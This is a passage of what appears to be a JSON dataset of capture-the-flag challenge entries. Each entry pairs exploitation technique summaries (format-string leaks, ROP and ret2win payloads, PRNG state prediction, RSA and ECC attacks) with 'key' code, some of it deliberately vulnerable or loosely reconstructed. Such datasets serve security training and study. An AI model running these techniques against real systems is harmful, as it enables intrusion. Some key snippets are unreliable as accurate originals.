            "In challenges related to predicting the output of a pseudo-random number generator (PRNG) where the seed is based on a predictable or partially known input, pre-generate a mapping of potential seeds to their corresponding first output. This approach reduces the computational effort needed at runtime by transforming the problem into a lookup task. Utilize this strategy especially in scenarios where the server provides part of the output sequence and expects the next value in the sequence without rate limiting, allowing for rapid trial-and-error without penalties.\n\n    Example payload structure (adjusted for specific challenge context):\n    ```\n    with open('seed_output_mapping.csv') as csvfile:\n        for row in csv.reader(csvfile):\n            # Assuming row[0] is the seed and row[1] is the first number generated by that seed\n            if target_output in seed_output_mapping:\n                candidate_seeds = seed_output_mapping[target_output]\n                # Use candidate_seeds to predict the next output.\n    ```",
            "In cases where the challenge involves communication with a server that sends a sequence generated from a seed and expects the next number in that sequence, iteratively test a subset of candidate seeds against additional sequences provided by the server upon request. This method is particularly effective in environments where the server does not implement request rate limiting. It allows for a brute-force approach across multiple attempts rather than necessitating the immediate identification of the correct seed.\n\n    Example approach (simplified for clarity):\n    ```\n    while True:\n        # Send a request to the server to obtain the current sequence\n        response = requests.post(target_url)\n        data = response.text.split(\"\\n\")\n        sequence = process_sequence_data(data)\n        \n        # Attempt to find the correct seed from a pre-generated list of candidate seeds\n        for seed, first_output in pre_generated_seed_output_pairs:\n            if sequence_matches(seed, sequence):\n                # Predict and submit the next number in the sequence\n                next_number = predict_next_number(seed, sequence)\n                submit_response = requests.post(target_url + \"submit\", data={\"next\": next_number})\n                if \"success_message\" in submit_response.text:\n                    print(\"Success:\", submit_response.text)\n                    break\n    ```"
        ],
        "key": "```php\n<?php\nif (isset($argv[1])) {\n    $seed = $argv[1];\n    mt_srand($seed);\n    for ($i = 0; $i < 10; $i++) {\n        echo mt_rand() . \"\\n\";\n    }\n}\n?>\n```"
    },
    {
        "name": "RCE Auditor",
        "write_up": "dataset/raw/RCE Auditor.md",
        "type": "web",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with restrictions imposed by browsers preventing access to certain ports (like `ERR_UNSAFE_PORT` for port 6666), an alternative approach using WebRTC API can be explored for establishing peer-to-peer connections that bypass these restrictions. This is particularly useful for scenarios where direct HTTP(S) connections to a target service are blocked either by browser security features or firewall rules.",
            "In scenarios where direct manipulation or control over network packets is required but restricted by standard client-server protocols (HTTP/S, FTP), leveraging the STUN protocol via WebRTC's ICE candidate configuration allows for partial control over the packet contents. Specifically, the exploitation of `ice-ufrag` and `ice-pwd` in the ICE candidate configuration can be used for authentication or other purposes, demonstrating that control over packet contents to some extent is possible, bypassing certain types of input filtering or RCE (Remote Code Execution) protection mechanisms.\n   \n   Example of exploiting this approach is not straightforward and requires deep understanding of the WebRTC API, STUN/TURN protocols, and the RFC 5245 (for `ice-ufrag` and `ice-pwd`). Proper construction of the exploit would involve setting up a WebRTC connection that includes malicious ICE candidates with carefully crafted `ice-ufrag` and `ice-pwd` values aiming to exploit vulnerabilities on the target server."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid eval_server() {\n    char command[256];\n    while (1) {\n        printf(\"Enter command: \");\n        fgets(command, sizeof(command), stdin);\n        system(command); // Vulnerable to command injection\n    }\n}\n\nint main() {\n    eval_server();\n    return 0;\n}\n```"
    },
    {
        "name": "RE warmup",
        "write_up": "dataset/raw/RE warmup.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 627,
        "max_score": 1000,
        "difficulty": 0.627,
        "knowledge": [
            "When analyzing statically compiled binaries for hidden or added functionalities, comparing available command-line parameters with those of the known original software can be an effective method. This comparison might reveal undocumented or altered functionalities introduced in the patched version. In this scenario, identifying an additional 'z' parameter not present in the original binary pointed to a modified functionality.",
            "To reverse engineer and decrypt hardcoded encrypted data embedded within a binary, one can follow the logical operations applied to the data and then apply the inverse operations. The first step involves understanding how the data is manipulated\u2014such as through combination of XOR and modular arithmetic operations on each byte of data. Subsequently, applying the inverse operations to the provided constants or encrypted data can reveal the original plaintext. In the described challenge, the encrypted data was processed through a loop with XOR and addition/subtraction operations; reversing these operations with the correct understanding of their application order and the modification per byte based on its index revealed the plaintext flag.\n\n```python\n# Inverse operations for decryption\ndef main():  \n   data = [0xAA, 0xB0, 0xA2, 0xB6, 0xA2, 0x91, 0x71, 0xB1, 0xA7, 0x80, 0x96, 0x97, 0x78, 0xB6, 0x9E, 0x99, 0x72, 0x97, 0x85, 0x98, 0x8F, 0x91, 0x7F, 0x77, 0x7C, 0x80, 0x9D, 0x61, 0xAB, 0x95, 0x8A, 0x7F, 0xB4, 0x8F, 0x9F, 0x35, 0x9F, 0x87, 0x8D, 0x98, 0x95, 0x9F, 0x8D, 0xAA]  \n   result = ''  \n   for i, d in enumerate(data):  \n       result += chr((d + 0x42 % (i + 1) - 0x41) ^ i)  \n   print(result)\n\nmain()  \n```"
        ],
        "key": "```c  \nindex = 0;  \ndo {  \n  allocated_buffer[index] =  \n       ((file_content[index] ^ (byte)index) + 0x41) - (char)(0x42 % (long)((int)index + 1));  \n  index = index + 1;  \n} while ((ulong)(iVar3 - 1) + 1 != index);\n\ncVar2 = *allocated_buffer;  \nlVar5 = 0x2d;  \npointer_to_consts = &some_consts;  \npcVar6 = acStack72;  \nwhile (lVar5 != 0) {  \n  lVar5 = lVar5 + -1;  \n  *pcVar6 = *pointer_to_consts;  \n  pointer_to_consts = pointer_to_consts + (ulong)bVar7 * -2 + 1;  \n  pcVar6 = pcVar6 + (ulong)bVar7 * -2 + 1;  \n}  \n\nif (cVar2 == -0x56) {  \n  lVar5 = 1;  \n  do {  \n    if (lVar5 == index) goto LAB_00400f06;  \n    pcVar6 = allocated_buffer + lVar5;  \n    pcVar1 = acStack72 + lVar5;  \n    lVar5 = lVar5 + 1;  \n  } while (*pcVar6 == *pcVar1);  \n}  \n```"
    },
    {
        "name": "Read The Rules",
        "write_up": "dataset/raw/Read The Rules.md",
        "type": "misc",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When participating in a CTF challenge that involves reviewing website content or rules, a direct inspection of the website's source code can reveal hidden flags or clues. Specifically, using browser functionalities such as 'Inspect Element' or 'View Page Source' can uncover elements not immediately visible on the page's surface. This method is particularly useful when the challenge hints suggest that the flag is embedded or hidden within the website itself.",
            "Clues or flags hidden in a CTF challenge's instructional or informational text often require attention to detail. In challenges where participants are advised to follow specific instructions or read through provided material, it is crucial to scrutinize every part of the text, including titles, footnotes, and seemingly inconsequential sections, as organizers may embed hints or flags directly within these texts."
        ],
        "key": "```html\n<!-- Hidden flag in the page source -->\n<!-- flag{its_time_to_hack} -->\n```"
    },
    {
        "name": "readflag",
        "write_up": "dataset/raw/readflag.md",
        "type": "misc",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios where a binary performs XOR operations on sensitive data using unpredictable data from a source like `/dev/urandom`, and direct reading of the binary's memory is not permitted due to filesystem permissions or security mechanisms, analyzing the behavior of system calls through `ptrace` with specific actions like `PTRACE_SYSCALL`, `PTRACE_GETREGS`, and `PTRACE_SETREGS` can be effective. By intercepting and modifying the syscall responsible for reading the unpredictable data (e.g., replacing the syscall number with an invalid one), you can control or bypass the randomness and extract the sensitive information in a predictable manner.",
            "When dealing with binaries that have the SUID bit set, traditional methods of environment manipulation, such as using `LD_PRELOAD` to inject custom behaviors, are typically neutralized for security reasons. In these cases, employing debugging and syscall tracing techniques with `ptrace` can be a viable alternative approach to manipulate or observe the binary's runtime execution. This approach allows for manipulation of the binary's behavior or extraction of data without needing write or read access to the binary file itself, as demonstrated by modifying the behavior of system calls during execution to bypass randomness sources or alter execution flow."
        ],
        "key": "```c  \n#include <stdio.h>\n\nconst char flag[] =\n\"fak3pts{nyanyanyanyanyanyanyanyanyanyanyanyanyanyanyanya}\";\n\nint main() {  \n   FILE *random;  \n   if ((random = fopen(\"/dev/urandom\", \"rb\")) == NULL) {  \n       perror(\"fopen\");  \n       return 1;  \n   }\n\n   for (const unsigned char *f = flag; *f; f++) {  \n       unsigned char r;  \n       if (fread(&r, 1, 1, random) != 1) {  \n           perror(\"fread\");  \n           return 1;  \n       }  \n       printf(\"%02x\", *f ^ r);  \n   }\n\n   printf(\"\\n\");\n\n   return 0;  \n}  \n```"
    },
    {
        "name": "Readme",
        "write_up": "dataset/raw/Readme.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In challenges involving format string vulnerabilities, if user input is directly passed to functions like `printf` without sanitization, we can leverage this to read values from the stack. By utilizing format specifiers such as `%p` along with `%<offset>$p`, we can extract information from specific stack locations. This technique is particularly useful for leaking memory addresses or other sensitive information stored in the stack.   \nExample payload: `%1$p`",
            "To systematically siphon data from a vulnerable application's memory, you can iteratively adjust the format string payload to read successive memory addresses. This process can be automated within a script by dynamically building payloads to leak more data with each request. Such scripts can be enhanced post-CTF for more efficient memory dumping by structuring format strings to fill the buffer capacity in each request, thereby reducing the number of needed interactions with the application.  \nExample improvement: Automating the payload generation to optimize the number of requests by concatenating multiple format specifiers until the buffer limit is reached, then sending the payload, and parsing leaked memory for valuable data."
        ],
        "key": "```c\nvoid vuln(void) {  \n FILE *flag_file;  \n long in_FS_OFFSET;  \n char flag [32];  \n char name [40];  \n long local_10;  \n  \n stack_canary = *(long *)(in_FS_OFFSET + 40);  \n flag_file = fopen(\"flag.txt\",\"r\");  \n fgets(local_58,28,flag_file);  \n fclose(flag_file);  \n puts(\"hello, what\\'s your name?\");  \n fgets(name,30,stdin);  \n printf(\"hello \");  \n printf(name);  \n if (stack_canary != *(long *)(in_FS_OFFSET + 40)) {  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "ready, bounce, pwn!",
        "write_up": "dataset/raw/ready, bounce, pwn!.md",
        "type": "pwn",
        "competition": [
            "DownUnderCTF/2021",
            "https://ctftime.org/event/1312/tasks/"
        ],
        "score": 436,
        "max_score": 494,
        "difficulty": 0.8825910931174089,
        "knowledge": [
            "In a scenario involving a stack pivot due to a controlled addition to the `rbp` register, if there's a limit to the payload size for a ROP chain, use smaller, strategic ROP gadgets to manipulate the stack and execute multiple stages of an attack. This can involve using gadgets to modify the stack pointer (`rsp`) directly or indirectly to execute different parts of the payload that couldn't fit into a single upload due to size constraints.\n   - Example approach: Leverage gadgets to manipulate `rsp` to execute sequential parts of a ROP chain, utilizing smaller chunks of payloads to eventually leak libc addresses, loop back to the beginning of the vulnerable function, and finally execute a crafted payload for a shell.",
            "In challenges with stack execution prevention (NX bit enabled) and a limited buffer overflow vulnerability not directly allowing for shellcode execution or when facing restrictions in payload size, pivoting the stack to execute pre-planned ROP chains in multiple stages allows for executing complex attacks in limited space.\n   - Example approach: Employ a small payload to leak a libc address by first pivoting the stack to the payload, then using known offsets to call further gadgets or functions (like `puts` to leak an address), and in a subsequent stage, adjusting the stack again to execute system calls or other desired functionality with newfound libc address calculations."
        ],
        "key": "```c\nundefined8 main(EVP_PKEY_CTX *param_1)  \n{  \n undefined local_28 [32];  \n  \n init(param_1);  \n printf(\"Hi there! What is your name? \");  \n read(0,local_28,0x18);  \n puts(\"That is an interesting name.\");  \n printf(\"Do you have a favourite number? \");  \n read_long();  \n return 0;  \n}\n```\n\n```asm\n 401239:        e8 6b ff ff ff          call   4011a9 <read_long>  \n 40123e:        48 01 c5                add    rbp,rax  \n 401241:        b8 00 00 00 00          mov    eax,0x0  \n 401246:        c9                      leave  \n 401247:        c3                      ret  \n```"
    },
    {
        "name": "real ECC",
        "write_up": "dataset/raw/real ECC.md",
        "type": "crypto",
        "competition": [
            "Chujowy/2020",
            "https://ctftime.org/event/1087/tasks/"
        ],
        "score": 470,
        "max_score": 500,
        "difficulty": 0.94,
        "knowledge": [
            "When solving discrete logarithm problems with elliptic curve cryptography (ECC) where the curve parameters are unknown, one approach is to analyze the given point addition law to deduce unique properties of the curve or operations. Specifically, one can attempt to simplify the operations into forms that enable the use of discrete logarithm solution techniques, such as the Pohlig-Hellman algorithm, especially when the curve's underlying field characteristic is smooth. This approach hinges on finding a mapping from the curve's point addition law to a simplified algebraic form that can be directly solved using known discrete log algorithms.",
            "In scenarios involving encryption schemes that rely on ECC, and where the encryption operation involves XORing plaintext with a shared ECC-derived secret, recovering the shared secret through curve analysis and discrete logarithm techniques enables decryption of messages. This can be achieved by first identifying a mathematical relationship that simplifies the ECC point operations into a form that is susceptible to discrete log attacks, and then using the discovered secret to reverse the encryption. Once the shared secret is obtained, it can be used to decrypt the message by XORing it with the encrypted content. This method is applicable in situations where the ECC operations do not conform to standard curve equations and where direct information about the curve is not provided.  \n\nExample payload (from the implementation section to demonstrate decryption with the obtained shared secret):  \n```python\nsecret = mul(FF, A, b_s)  # Calculate the shared secret using the derived discrete log\ns = secret[0] * secret[1]  # Combine the calculated components to form the decryption key\n\nprint(long_to_bytes(Integer(enc)^^Integer(s)))  # Decrypt the message by XORing with the shared secret\n```"
        ],
        "key": "```python\ndef add(F, p1, p2):  \n   try:  \n       return {p1: p2, p2: p1}[-1]  \n   except:  \n       pass  \n   x1, y1 = p1  \n   x2, y2 = p2  \n   x3 = FF(x1*x2 - x1*y2 - x2*y1 + 2*y1*y2) / FF(x1 + x2 - y1 - y2 - 1)  \n   y3 = FF(y1*y2) / FF(x1 + x2 - y1 - y2 - 1)  \n   return (x3, y3)\n\ndef mul(F, x, k):  \n   acc = -1  \n   while k:  \n       if k & 1:  \n           acc = add(F, x, acc)  \n       # acc = add(F, acc, acc) Typo in challenge  \n       acc = add(F, x, x)  \n       k //= 2  \n   return acc\n```"
    },
    {
        "name": "Real Mersenne",
        "write_up": "dataset/raw/Real Mersenne.md",
        "type": "crypto",
        "competition": [
            "Zh3r0/2021",
            "https://ctftime.org/event/1285/tasks/"
        ],
        "score": 949,
        "max_score": 997,
        "difficulty": 0.9518555667001003,
        "knowledge": [
            "To predict future outputs of Python's `random.random()` when it uses a Mersenne Twister (MT) as its PRNG, one must extract a sufficient number of actual bits from the MT's output to deduce its internal state. This can be achieved by understanding the implementation detail that Python's `random.random()` function generates its floating-point numbers by shifting and combining bits from two consecutive `genrand_uint32()` calls from the MT. The specific operation is to shift the first 32-bit output right by 5 bits (discarding the lowest 5 bits) and the second 32-bit output right by 6 bits (discarding the lowest 6 bits), then combining these to form the fractional part of the floating-point number.",
            "After gathering the requisite number of bit sequences from the MT's outputs, one can utilize tools like Z3 with a script designed for the symbolic execution of Mersenne Twister to recover the PRNG's internal state. This makes it possible to predict subsequent outputs. The scripts or tools designed for this purpose often require submitting truncated outputs in a specific format, accommodating the circumstances of having partial information about the generated numbers. This approach is based on the principle that after observing 624 outputs from the Mersenne Twister, one can theoretically solve for its initial seed and predict future outputs, which is critical for challenges that involve predicting PRNG outputs.\n\nSample of Z3 solver usage (Python code snippet):\n```python\nfrom z3 import *\n\n# Assuming `a` and `b` are obtained bit sequences as strings where known bits are represented literally and unknown bits by '?'\na, b = \"11001010????????11001010????????\" , \"110010??????????1100101?????????\"\n\n# Initialize the untwister and submit `a` and `b`. Specific implementation details may vary.\nut = Untwister()\nut.submit(a)\nut.submit(b)\n# Trigger the solving process\ntry:\n    ut.solve()\n    print(\"Seed found:\", ut.get_seed())\nexcept Exception as e:\n    print(\"Failed to find the seed:\", str(e))\n```\nThis pseudo-code demonstrates how to interact with a hypothetical untwister object, which represents a solver that can handle the recovery of Mersenne Twister's internal state from partial outputs. Actual implementations require adjusting the code to match the specific API and behavior of the used untwister tool."
        ],
        "key": "```python  \nimport random  \nfrom secret import flag  \nfrom fractions import Fraction\n\ndef score(a, b):  \n   if abs(a - b) < 1 / 2 ** 10:  \n       # capping score to 1024 so you dont get extra lucky  \n       return Fraction(2 ** 10)  \n   return Fraction(2 ** 53, int(2 ** 53 * a) - int(2 ** 53 * b))\n\ntotal_score = 0  \nfor _ in range(2000):  \n   try:  \n       x = random.random()  \n       y = float(input(\"enter your guess:\\n\"))  \n       round_score = score(x, y)  \n       total_score += float(round_score)  \n       print(\"total score: {:0.2f}, round score: {}\".format(total_score, round_score))  \n       if total_score > 10 ** 6:  \n           print(flag)  \n           exit(0)  \n   except:  \n       print(\"Error, exiting\")  \n       exit(1)  \nelse:  \n   print(\"Maybe better luck next time\")  \n```\n\n```c  \n/*  \n*...  \n* In effect, `a` contains 27 random bits shifted left 26, and `b` fills in the  \n* lower 26 bits of the 53-bit numerator.  \n*/  \nstatic PyObject *  \n_random_Random_random_impl(RandomObject *self)  \n/*[clinic end generated code: output=117ff99ee53d755c\ninput=afb2a59cbbb00349]*/  \n{  \n   uint32_t a=genrand_uint32(self)>>5, b=genrand_uint32(self)>>6;  \n   return PyFloat_FromDouble((a*67108864.0+b)*(1.0/9007199254740992.0));  \n}  \n```"
    },
    {
        "name": "reality",
        "write_up": "dataset/raw/reality.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 279,
        "max_score": 500,
        "difficulty": 0.558,
        "knowledge": [
            "When dealing with a binary exploitation CTF challenge, employing the Return Oriented Programming (ROP) technique can be effective for constructing an exploit, particularly when direct execution of shellcode is prevented. ROP works by finding and utilizing instructions already present in the binary's code (gadgets) to execute arbitrary operations. This is often used to circumvent protections such as non-executable stack (NX) or Data Execution Prevention (DEP).\n    - Example payload component: `rop.chain()`",
            "In scenarios requiring interaction with a remote service to exploit a binary, leveraging a combination of local debugging and remote execution can streamline the development of the exploit. Tools like `pwntools` can be used to switch between local debugging, local execution, and remote execution by changing arguments. This facilitates testing the exploit in a controlled environment before deploying it against the target remote service.\n    - Example for switching between local and remote: \n        - Use `args.GDB` for local debugging with GDB.\n        - Use `args.REMOTE` for connecting to the remote service.\n        - Use `args.LOCAL` for local testing without debugging symbols."
        ],
        "key": "```python\ndef clickit(a, b, c):\n    buffer = [0] * 10\n    buffer[0] = a\n    buffer[1] = b\n    buffer[2] = c\n    # Vulnerable code: no bounds checking on buffer\n    for i in range(3, len(buffer)):\n        buffer[i] = 0\n    return buffer\n```"
    },
    {
        "name": "Really Speedy Algorithm",
        "write_up": "dataset/raw/Really Speedy Algorithm.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 350,
        "max_score": 700,
        "difficulty": 0.5,
        "knowledge": [
            "For RSA-based CTF challenges, when given **p, q,** and **e** (RSA public key parts), it's crucial to understand how to compute **d** (the private key), as **d** is the modular multiplicative inverse of **e** modulo **phi(n)**, where **phi(n)** is Euler's totient function calculated as **(p-1)*(q-1)**. This process is essential for decrypting messages or signatures encrypted with the public key.  \n**Python example:**  \n```python\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    return x % m\n    \ndef find_d(p, q, e):\n    phi = (p - 1) * (q - 1)\n    d = modinv(e, phi)\n    return d\n```",
            "For challenges involving RSA operations, if the task is to find the original plaintext (**pt**) given **p, q (or phi), e,** and the ciphertext (**ct**), or to generate ciphertext given the plaintext, the RSA encryption and decryption formulas can be applied directly. For encryption, use **ct = pt^e mod n**. For decryption or recovering the plaintext, calculate **d** as outlined in point 1, then apply **pt = ct^d mod n**. These operations rely on the core RSA property where **n = p * q** and **phi(n) = (p-1) * (q-1)**.  \n**Python example for finding plaintext (pt):**  \n```python\ndef find_pt(p, q, e, ct):\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    d = modinv(e, phi)  # Use the modinv function as described in point 1\n    pt = pow(ct, d, n)\n    return pt\n```"
        ],
        "key": "```python\ndef find_pt(p, q, e, ct):  \n   n = p * q  \n   phi = (p - 1) * (q - 1)  \n   d = modinv(e, phi)  \n   pt = pow(ct, d, n)  \n   return pt\n\ndef find_ct(p, q, e, pt):  \n   n = p * q  \n   phi = (p - 1) * (q - 1)  \n   ct = pow(pt, e, n)  \n   return ct\n\ndef find_d(p, q, e):  \n   n = p * q  \n   phi = (p - 1) * (q - 1)  \n   d = modinv(e, phi)  \n   return d\n```"
    },
    {
        "name": "really_obnoxious_problem",
        "write_up": "dataset/raw/really_obnoxious_problem.md",
        "type": "pwn",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 140,
        "max_score": 250,
        "difficulty": 0.56,
        "knowledge": [
            "In a challenge that requires exploitation through a buffer overflow to execute a specific function that takes arguments, it's crucial to understand the calling convention used by the program, especially for functions that require multiple arguments. In the case of 64-bit ELF binaries on Linux, the first few function arguments are passed via registers (rdi, rsi, rdx, rcx, r8, and r9). To control these registers, one must find or craft specific gadgets (sequences of instructions ending with `ret`) that pop values into them. Usually, `pop rdi; ret;` and `pop rsi; pop r15; ret;` gadgets are sought after for setting up the first and second arguments respectively. The `ret2win` technique involves crafting a payload that overflows the buffer and sets up the stack in such a way that it directs execution flow to these gadgets and subsequently to the target function with the desired arguments.",
            "When dealing with binary exploitation challenges, it's important to send payloads in the correct format and order, taking into account the program's input methods and execution flow. This includes crafting payloads that include the addresses of gadgets, followed by the argument values they are meant to place in registers, and finally the address of the function to be executed. In doing so, one must also consider any offsets to reach the return address on the stack, which is typically filled with a buffer overflow. The use of tools like `pwntools` can greatly simplify the creation and sending of these payloads, allowing for automatically packing addresses in the correct format and sending them after triggering prompts or specific input requests from the vulnerable program.\n\nExample payload (applicable to the provided scenario):\n```python\npayload = flat({\n    offset: [\n        pop_rdi,\n        0x1337,  # Argument to be placed in RDI\n        pop_rsi_r15,\n        exe.sym.name,  # Argument to be placed in RSI\n        0x0,  # Value to fill R15, often a dummy value due to the double pop gadget\n        exe.functions.flag  # Address of the 'flag' function or target function to call\n    ]\n})\n```"
        ],
        "key": "```c\nvoid ret2win(int arg1, char *arg2) {\n    // Vulnerable function that can be exploited\n    printf(\"Argument 1: %d\\n\", arg1);\n    printf(\"Argument 2: %s\\n\", arg2);\n    // Potentially dangerous operations with arg2\n}\n```"
    },
    {
        "name": "real_ec",
        "write_up": "dataset/raw/real_ec.md",
        "type": "pwn",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "When dealing with the task of reversing cryptographic operations within a domain that cannot be efficiently broken, such as ECDSA with well-established curves like P256, a feasible strategy under constrained conditions involves leveraging brute-force techniques in creative ways. Specifically, for challenges where the cryptographic operation involves unknown coefficients applied to known values or operations (e.g., scalar multiplication in elliptic curves), employing a meet-in-the-middle strategy can significantly reduce the computational effort. This approach requires creating a lookup table for a portion of the computation (up to k bits of the operation) and then conducting a brute-force search for the remaining bits (40-k bits in the provided scenario) in parallel, balancing the search space against available computational resources.",
            "Optimizing brute-force search under tightly constrained time frames, particularly in cryptographic contexts where operations like point multiplication on elliptic curves are involved, can benefit from precomputing inverses of possible coefficients (in this case, the unknown *n*) and exploring algebraic properties of the operation (e.g., utilizing addition of points instead of multiplication for speedup). This requires an understanding of the underlying mathematical operations and the ability to parallelize the lookup process efficiently across available hardware resources, such as using servers with a high number of cores. In scenarios with extremely large datasets (several terabytes in size) that make direct brute-force infeasible, this combined approach of meet-in-the-middle with computational optimizations and parallel processing enables the handling of otherwise intractable problems within practical time limits.\n\nExample of optimization in elliptic curve operations:\nAssuming a scenario where point addition is faster than point multiplication, one could implement a variant of the double-and-add algorithm for elliptic curves that focuses on maximizing the use of point addition operations over point multiplication wherever possible. Unfortunately, without specific code or parameters, providing a direct \"payload\" or command example is not applicable, but the emphasis lies in algorithmic optimization based on cryptographic properties."
        ],
        "key": "```python\nimport os\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.backends import default_backend\n\n# Generate a random 1000-byte secret\nsecret = os.urandom(1000)\n\n# Split the secret into 250 32-bit integers\ne = [int.from_bytes(secret[i:i+4], 'big') for i in range(0, 1000, 4)]\n\n# Generate random n values with 8 unknown bits\nn_values = [os.urandom(1)[0] for _ in range(250)]\n\n# Calculate g^(e_i * n) for each part\ncurve = ec.SECP256R1()\ng = ec.generate_private_key(curve, default_backend()).public_key()\n\nresults = []\nfor e_i, n in zip(e, n_values):\n    # Vulnerable point multiplication\n    result = g.public_numbers().x * (e_i * n)\n    results.append(result)\n```"
    },
    {
        "name": "REdo 2",
        "write_up": "dataset/raw/REdo 2.md",
        "type": "reverse",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 152,
        "max_score": 500,
        "difficulty": 0.304,
        "knowledge": [
            "When reverse engineering assembly code challenges in CTFs, converting the assembly code to a more readable format like Pseudo-C can simplify understanding the logic and identifying the algorithm or checks being performed. To convert assembly code written in AT&T syntax to Intel syntax, which might be more familiar to many, add `.intel_syntax noprefix` at the top of the assembly file before assembling it. This approach is useful in cases where disassemblers like Binary Ninja or Ghidra are used to automate the reverse engineering process. This can aid significantly in understanding the flow and operations of the program, making it easier to craft a solver or identify vulnerabilities.",
            "In challenges involving string manipulation or conditional checks where characters of a flag or input are being modified in a loop, it's possible to reverse the logic by setting up a Python script to replicate the operations performed by the assembly code. If the challenge involves operations like adding or subtracting from ASCII values, shifting characters, or conditional checks against specific values, these can be translated into Python expressions and loops to methodically reconstruct the flag or input string. This approach requires identifying loops and conditions in the disassembled code that manipulate data, then mirroring those operations in a high-level language like Python. This strategy allows for a systematic approach to solving reverse engineering challenges focused on string manipulation. \n\nExample Python snippet based on the extracted logic:\n```python\nflag = [0]*39  # Adjust size accordingly based on the challenge\n# Sample operations translated from the assembly logic to Python\nflag[0x1] = 0x38 + 0x31  # Example of adjusting ASCII values\nflag[0x0] = 0x36 + 0x31\n# Replicate operations such as shifts or character replacements as seen in assembly\n# Example loop mirroring assembly operations\nfor o in range(0, 3):  \n    for k in range(0, 4):  \n        for j in range(0, 5):  \n            flag[j + 0xf] = 0x32 + 0x31  \n        flag[k + 0xa] = 0x31 + 0x31  \n    flag[o + 0x6] = 0x30 + 0x31\n# Convert the numeric values back to characters to form the flag\nprint(''.join(map(chr, flag)))\n```\nThis script simplifies the reverse engineering process by mirroring the logic found in the disassembly, adjusting for any transformations applied to the data within the program, and reconstructing the potentially manipulated string or flag."
        ],
        "key": "```c\nvoid* const var_4 = __return_addr;\nint32_t* var_10 = &arg1;\nint32_t eax_1;\nif (arg1 != 2)  \n   eax_1 = 1;  \nelse { \n   void* var_14_1 = nullptr;  \n   while (true) { \n       if (var_14_1 > 0x1c) { \n           char* eax_7 = malloc(0x1d);  \n           for (void* var_18_1 = nullptr; var_18_1 <= 0x1c; var_18_1 = var_18_1 + 1) { \n               *(eax_7 + var_18_1) = *(var_18_1 + *(arg2 + 4));  \n               *(eax_7 + var_18_1) = *(eax_7 + var_18_1) - 0x31;  \n           }\n           if (*eax_7 != eax_7[2])  \n               eax_1 = 1;  \n           else if (eax_7[1] != 0x38)  \n               eax_1 = 1;  \n           else if (*eax_7 != 0x36)  \n               eax_1 = 1;  \n           else if (eax_7[3] != 0x34)  \n               eax_1 = 1;  \n           else if (sx.d(eax_7[0x1c]) != sx.d(eax_7[5]) + 2)  \n               eax_1 = 1;  \n           else if (eax_7[5] != 0x4a)  \n               eax_1 = 1;  \n           else if (eax_7[4] != 0x3c)  \n               eax_1 = 1;  \n           else { \n               int32_t var_1c_1 = 0;  \n               while (true) { \n                   if (var_1c_1 > 2) { \n                       int32_t var_20_1 = 0;  \n                       while (true) { \n                           if (var_20_1 > 3) { \n                               int32_t var_24_1 = 0;  \n                               while (true) { \n                                   if (var_24_1 > 4) { \n                                       if (sx.d(eax_7[0x15]) != sx.d(eax_7[0xf]) + 1)  \n                                           eax_1 = 1;  \n                                       else if (eax_7[9] != eax_7[0xe])  \n                                           eax_1 = 1;  \n                                       else if (eax_7[9] != eax_7[0x14])  \n                                           eax_1 = 1;  \n                                       else if (eax_7[9] != eax_7[0x16])  \n                                           eax_1 = 1;  \n                                       else if (eax_7[9] != 0x2e)  \n                                           eax_1 = 1;  \n                                       else if (eax_7[0x1b] != 1)  \n                                           eax_1 = 1;  \n                                       else if (eax_7[0x1a] != 2)  \n                                           eax_1 = 1;  \n                                       else if (eax_7[0x17] != 3)  \n                                           eax_1 = 1;  \n                                       else if (eax_7[0x18] == 4)  \n                                           eax_1 = sx.d(eax_7[0x19]);  \n                                       else  \n                                           eax_1 = 1;  \n                                       break;  \n                                   }\n                                   if (eax_7[var_24_1 + 0xf] != 0x32) { \n                                       eax_1 = 1;  \n                                       break;  \n                                   }\n                                   var_24_1 = var_24_1 + 1;  \n                               }\n                               break;  \n                           }\n                           if (eax_7[var_20_1 + 0xa] != 0x31) { \n                               eax_1 = 1;  \n                               break;  \n                           }\n                           var_20_1 = var_20_1 + 1;  \n                       }\n                       break;  \n                   }\n                   if (eax_7[var_1c_1 + 6] != 0x30) { \n                       eax_1 = 1;  \n                       break;  \n                   }\n                   var_1c_1 = var_1c_1 + 1;  \n               }\n           }\n           break;  \n       }\n       if (*(var_14_1 + *(arg2 + 4)) == 0) { \n           eax_1 = 1;  \n           break;  \n       }\n       var_14_1 = var_14_1 + 1;  \n   }\n}\nreturn eax_1;\n```"
    },
    {
        "name": "refcnt",
        "write_up": "dataset/raw/refcnt.md",
        "type": "pwn",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 159,
        "max_score": 500,
        "difficulty": 0.318,
